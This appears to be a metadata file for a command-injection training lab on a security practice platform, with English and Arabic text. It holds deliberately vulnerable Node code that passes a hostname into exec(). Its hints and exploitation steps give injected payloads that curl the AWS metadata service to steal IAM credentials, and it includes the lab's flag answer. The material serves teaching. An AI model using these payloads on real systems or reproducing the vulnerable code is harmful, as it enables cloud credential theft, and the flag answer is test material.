// src/modules/practice-labs/command-injection/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab4Metadata: LabMetadata = {
  slug: 'cmdi-api-cloud-provisioning-hostname',
  title: 'Command Injection: API Parameter — Cloud Server Provisioning',
  ar_title: 'حقن الأوامر: معامل API — توفير الخادم السحابي',
  description:
    'Exploit a command injection vulnerability in a cloud infrastructure provisioning API where the server hostname parameter is used in a shell script. Chain multiple commands to read cloud instance metadata, IAM credentials, and ultimately exfiltrate AWS access keys.',
  ar_description:
    'استغل ثغرة حقن أوامر في API توفير البنية التحتية السحابية حيث يُستخدم معامل hostname الخادم في سكريبت shell. سلسل أوامر متعددة لقراءة بيانات تعريف instance السحابية وبيانات IAM وسرب مفاتيح AWS.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'Cloud Security',
    'AWS Metadata Attack',
    'IAM Credential Theft',
    'API Security',
  ],
  xpReward: 350,
  pointsReward: 175,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  goal: 'Inject commands into the server provisioning hostname parameter to: 1) confirm RCE, 2) read AWS instance metadata at 169.254.169.254, 3) extract IAM temporary credentials containing the flag.',
  scenario: {
    context:
      'CloudForge is a cloud infrastructure platform. The /servers/provision endpoint accepts a hostname for the new server. The backend runs a provisioning script: exec("./provision.sh --hostname " + hostname + " --region us-east-1"). The hostname is not validated. An attacker can inject commands to access the AWS instance metadata service (IMDS) and steal IAM role credentials.',
    vulnerableCode: `// Server provisioning (vulnerable):
app.post('/servers/provision', isAuthenticated, async (req, res) => {
  const { hostname, region, size } = req.body;
  // ❌ hostname injected into shell script
  const result = await exec(
    \`./provision.sh --hostname \${hostname} --region \${region} --size \${size}\`
  );
  res.json({ jobId: generateJobId(), status: 'provisioning' });
});`,
    exploitation:
      '1. hostname: "web-01; whoami" → confirm RCE\n2. hostname: "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" → get IAM role name\n3. hostname: "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" → get AWS keys',
  },
  hints: [
    {
      order: 1,
      xpCost: 25,
      content:
        'The provisioning API runs a shell script with your hostname. Try hostname: "web-01; whoami" to confirm command injection.',
    },
    {
      order: 2,
      xpCost: 45,
      content:
        'Confirmed RCE! AWS EC2 instances have a metadata service at 169.254.169.254. Try: hostname: "web-01; curl http://169.254.169.254/latest/meta-data/"',
    },
    {
      order: 3,
      xpCost: 70,
      content:
        'GET /latest/meta-data/iam/security-credentials/ returns the IAM role name. Then GET /latest/meta-data/iam/security-credentials/<ROLE_NAME> returns temporary AWS credentials.',
    },
    {
      order: 4,
      xpCost: 100,
      content:
        'hostname: "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" — the response contains AccessKeyId, SecretAccessKey, and the flag.',
    },
  ],
  flagAnswer: 'FLAG{CMDI_API_CLOUD_PROVISIONING_AWS_IMDS_IAM_THEFT}',
  initialState: {
    contents: [
      {
        title: 'IMDS_ROOT',
        body: JSON.stringify({
          path: 'http://169.254.169.254/latest/meta-data/',
          content:
            'ami-id\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\nplacement/\npublic-ipv4',
        }),
        author: 'aws_imds',
        isPublic: false,
      },
      {
        title: 'IMDS_IAM',
        body: JSON.stringify({
          path: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          content: 'CloudForgeRole',
        }),
        author: 'aws_imds',
        isPublic: false,
      },
      {
        title: 'IMDS_CREDS',
        body: JSON.stringify({
          path: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole',
          content: JSON.stringify({
            Code: 'Success',
            Type: 'AWS-HMAC',
            AccessKeyId: 'ASIA_CLOUDFORGE_XYZ789',
            SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            Token: 'AQoDYXdzEJr_EXAMPLE_SESSION_TOKEN',
            Expiration: '2026-03-06T06:00:00Z',
            Flag: 'FLAG{CMDI_API_CLOUD_PROVISIONING_AWS_IMDS_IAM_THEFT}',
          }),
        }),
        author: 'aws_imds',
        isPublic: false,
      },
    ],
  },
};
